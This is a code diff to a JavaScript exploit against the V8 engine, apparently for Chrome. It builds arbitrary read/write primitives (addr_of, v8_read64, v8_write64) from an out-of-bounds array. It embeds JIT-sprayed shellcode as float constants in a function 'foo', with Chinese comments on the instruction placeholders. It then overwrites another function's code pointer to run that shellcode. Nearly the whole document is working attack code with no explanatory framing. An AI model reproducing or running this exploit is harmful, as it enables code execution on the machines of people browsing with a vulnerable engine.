@@ -33,12 +33,12 @@ var conv_ab = new ArrayBuffer(8);
 var conv_f64 = new Float64Array(conv_ab);
 var conv_b64 = new BigInt64Array(conv_ab);
 
-function dtoi(f) {
+function f2i(f) {
     conv_f64[0] = f;
     return conv_b64[0];
 }
 
-function itod(i) {
+function i2f(i) {
     conv_b64[0] = i;
     return conv_f64[0];
 }
@@ -57,63 +57,143 @@ function unsmi(i) {
     return i >> 1n;
 }
 
+function hex(i){
+  return "0x"+i.toString(16).padStart(16,"0");
+}
+
+const foo = ()=>
+  {
+      return [
+          1.0,
+          1.97128800932264e-246,
+          1.9710251538487089e-246,//占位1 20
+  1.9535165331756856e-246,
+  1.9711831786218553e-246,
+  1.9711302582276649e-246,//mov rdx,rdx+60h，这一行后面加一个mov rdx,rdx+18h
+  1.971182386370243e-246,//增加完毕
+  1.9711824204694007e-246,//替换qword from dword
+  1.971182625597146e-246,
+  1.9711062190503973e-246,
+  1.9844872658808452e-246,
+  1.9710442338776101e-246,//占位2 200
+  1.9346517240445797e-246,
+  1.9539187092919419e-246,//占位3 240
+  1.9398291100944961e-246,
+  1.9889043320213015e-246,
+  5.4347192807448249e-232,//需要更换跳转到+3的位置 300
+  5.5483866078232455e-232,//test rax, rax 占位4 323
+  5.4347193054904659e-232,
+  5.5483858407041602e-232,
+  5.548386599938718e-232,
+  5.5483852580972086e-232,
+  5.5483866085489296e-232,
+  5.5483866082450352e-232,//占位5替换指令 test   rcx,rcx 461
+  5.4347192989761578e-232,
+  5.5483866082673696e-232,
+  5.5483865052825693e-232,
+  5.5929115874408499e-232,
+  5.5483869437399541e-232,
+  5.5483850365737534e-232,
+  5.548386607845941e-232,
+  5.5483866055903481e-232,//占位6替换指令：622 cmp al,ah
+  5.5483866055790415e-232,
+  5.5479675990708206e-232,
+  5.5483866086060441e-232,//占位7：691
+  5.6360051602057723e-232,
+  5.5483866055757255e-232,
+  5.5483853060875066e-232,
+  5.5485814548559491e-232,
+  5.5481638823537202e-232,
+  5.5483852101069105e-232,
+  5.5483873667057662e-232,
+  5.548386503033024e-232,
+  5.5482136635123504e-232,
+  5.5482200888855405e-232,
+  5.5056845587187283e-232,
+  5.4993936985335533e-232,
+  5.5057579849776769e-232,
+  5.5483865996697425e-232,
+  5.5487288654373309e-232,//占位8 1059
+  5.548387392950241e-232,
+  5.5483866079393109e-232,
+  5.5479425928198922e-232,// lea     rcx,[rbp+0x57a]
+  5.5483866055757276e-232,
+  5.5479429440804607e-232,
+  5.5412087282453567e-232,
+  5.5483866055884766e-232,
+  5.5482086832973947e-232,
+  5.5587464282218089e-232,
+  5.4667737614685567e-232,
+  5.5483856568047451e-232,//占位9 1289
+  5.5480699333653622e-232,//占位10 
+  5.5482848842675359e-232,
+  5.6065483607039769e-232,
+  5.5483866088298074e-232,//mov movsxd替换 1381
+  9.5545979395580963e-307
+      ];
+  }
+  for (let i = 0; i < 0x10000; i++) {
+      foo();foo();foo();foo();
+  }
+  const f_x = () => 123;
+
 const FIXED_ARRAY_HEADER_SIZE = 8n;
 var large_arr = new Array(0x10000);
-large_arr.fill(itod(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
+large_arr.fill(i2f(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
 var packed_map = null;
 var packed_double_map = null;
 var packed_double_props = null;
 var fake_arr_elements_addr = null;
 var fake_arr = null;
 
-function fake_obj(addr) {
-    large_arr[0] = itod(packed_map | (packed_double_props << 32n));
-    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));
-    large_arr[3] = itod(ptr(addr));
+// function fake_obj(addr) {
+//     large_arr[0] = i2f(packed_map | (packed_double_props << 32n));
+//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(1n) << 32n));
+//     large_arr[3] = i2f(ptr(addr));
     
-    let result = fake_arr[0];
+//     let result = fake_arr[0];
     
-    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 
+//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n)); 
     
-    return result;
-}
+//     return result;
+// }
 
 
-function addr_of(obj) {
-    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
-    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));
+// function addr_of(obj) {
+//     large_arr[0] = i2f(packed_double_map | (packed_double_props << 32n));
+//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(1n) << 32n));
     
-    fake_arr[0] = obj;
-    let result = dtoi(large_arr[3]) & 0xFFFFFFFFn;
+//     fake_arr[0] = obj;
+//     let result = f2i(large_arr[3]) & 0xFFFFFFFFn;
     
-    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 
+//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n)); 
     
-    return result;
-}
+//     return result;
+// }
 
-function v8_read64(addr) {
-    addr -= FIXED_ARRAY_HEADER_SIZE;
+// function v8_read64(addr) {
+//     addr -= FIXED_ARRAY_HEADER_SIZE;
     
-    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
-    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));
+//     large_arr[0] = i2f(packed_double_map | (packed_double_props << 32n));
+//     large_arr[1] = i2f(ptr(addr) | (smi(1n) << 32n));
     
-    let result = dtoi(fake_arr[0]);
+//     let result = f2i(fake_arr[0]);
     
-    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 
+//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n)); 
 
-    return result;    
-}
+//     return result;    
+// }
 
-function v8_write64(addr, val) {
-    addr -= FIXED_ARRAY_HEADER_SIZE;
+// function v8_write64(addr, val) {
+//     addr -= FIXED_ARRAY_HEADER_SIZE;
     
-    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
-    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));
+//     large_arr[0] = i2f(packed_double_map | (packed_double_props << 32n));
+//     large_arr[1] = i2f(ptr(addr) | (smi(1n) << 32n));
     
-    fake_arr[0] = itod(val);
+//     fake_arr[0] = i2f(val);
     
-    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));   
-}
+//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n));   
+// }
 
 function gc_minor() { //scavenge
     for(let i = 0; i < 1000; i++) {
@@ -235,51 +315,63 @@ for(let i = 0; i < 11; i++) {
 }
 //*
 //%Debugprint(corrupted_obj);
-corrupted_obj.p18 = 0x30; //modify length of arr1 array
-//%Debugprint(arr1);
-alert(arr1[7]);
-let large_arr_addr = dtoi(arr1[7]) & 0xFFFFFFFFn;
-let large_arr_elements_field_addr = large_arr_addr + 8n;
-
-let packed_double_map_and_props = dtoi(arr1[4]);
-packed_double_map = packed_double_map_and_props & 0xFFFFFFFFn;
-packed_double_props = packed_double_map_and_props >> 32n;
-let packed_double_elements = dtoi(arr1[5]) & 0xFFFFFFFFn;
-
-let packed_map_and_props = dtoi(arr1[11]);
-packed_map = packed_map_and_props & 0xFFFFFFFFn;
-let packed_props = packed_map_and_props >> 32n;
-
-let fixed_arr_map = dtoi(arr1[6]) & 0xFFFFFFFFn;
-
-arr1[0] = itod(packed_double_map | (packed_double_props << 32n));
-arr1[1] = itod((large_arr_elements_field_addr - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
-
-let temp_fake_arr_addr = packed_double_elements + FIXED_ARRAY_HEADER_SIZE;
-arr1[7] = itod(temp_fake_arr_addr);
-let temp_fake_arr = arr2[0];
-let large_arr_elements_addr = dtoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
-temp_fake_arr = null;
-
-let fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
-fake_arr_elements_addr = fake_arr_addr + 16n;
-
-large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
-large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
-large_arr[2] = itod(fixed_arr_map | (smi(0n) << 32n));
-
-arr1[7] = itod(fake_arr_addr);
-fake_arr = arr2[0];
-
-//cleanup
-corrupted_obj.p18 = 4;
-let small_obj_addr = addr_of(small_obj);
-let small_obj_map_and_props = v8_read64(small_obj_addr);
-let corrupted_obj_addr = addr_of(corrupted_obj);
-v8_write64(corrupted_obj_addr, small_obj_map_and_props); //restore the corrupted MAP
-corrupted_obj = null;
+corrupted_obj.p18 = 0x1000; //modify length of arr1 array
+var obj_dict = {mark:0xdead,mark1:0x1337,obj:{}};
+var foo_arr = [1.1,2.2,3.3,4.4];
+var obj_idx = 76;
+function addr_of(obj) {
+    obj_dict.obj = obj;
+    return f2i(arr1[76]) & 0xffffffffn;
+}
 
 
+var element_idx = 101;
+function v8_read64(addr){
+    arr1[element_idx] = i2f((0x8n << 32n) + ((addr-0x8n) | 0x1n));
+    return (f2i(foo_arr[0]));
+}
+function v8_write64(addr,val){
+    arr1[element_idx] = i2f((0x8n << 32n) + ((addr-0x8n) | 0x1n));
+    foo_arr[0] = i2f(val);
+}
+// %DebugPrint(arr1);
+// %DebugPrint(obj_dict);
+// %DebugPrint(foo_arr);
+// let foo_arr_addr = addr_of(foo_arr);
+// let double_map = v8_read64(foo_arr_addr);
+// alert("[+]foo_arr_addr : " + hex(foo_arr_addr));
+// alert("[+]double_map : " + hex(double_map));
+
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+var f = wasmInstance.exports.main;
+var buf1 = new ArrayBuffer(0x200);
+var dataview1 = new DataView(buf1);
+let instance_addr = addr_of(wasmInstance);
+      // %DebugPrint(buf1);
+console.log("[+]wasm instance addr : " + hex(instance_addr));
+let rwx_addr = v8_read64(instance_addr-1n+0x60n);
+console.log("[+]rwx addr : " + hex(rwx_addr));
+let buf_addr = addr_of(buf1);
+console.log("[+]buf_addr : " + hex(buf_addr));
+var foo_addr = addr_of(foo);
+
+console.log("[+]foo addr :" + hex(foo_addr));
+var code_addr = v8_read64(foo_addr+0x18n) & 0xffffffffn;
+console.log("[+]code addr : " + hex(code_addr));
+// // %SystemBreak();
+
+var jit_addr = v8_read64(code_addr+0x7n);
+console.log("[+]jit code addr : " + hex(jit_addr));
+var f_x_addr = addr_of(f_x);
+console.log("[+]f_x_addr : " + hex(f_x_addr));
+var f_x_code_addr = v8_read64(f_x_addr+0x18n) & 0xffffffffn;
+console.log("[+]f_x_code_addr : " + hex(f_x_code_addr));
+v8_write64(f_x_code_addr+0x7n+0x8n,jit_addr+0xb3n+0x6n);
+// %DebugPrint(f_x);
+alert("target : " + hex(jit_addr+0xb3n+0x6n));
+f_x();
 //%GlobalPrint("large arr ======================\n");
 //%Debugprint(large_arr);
 //%GlobalPrint("arr1 ===========================\n");
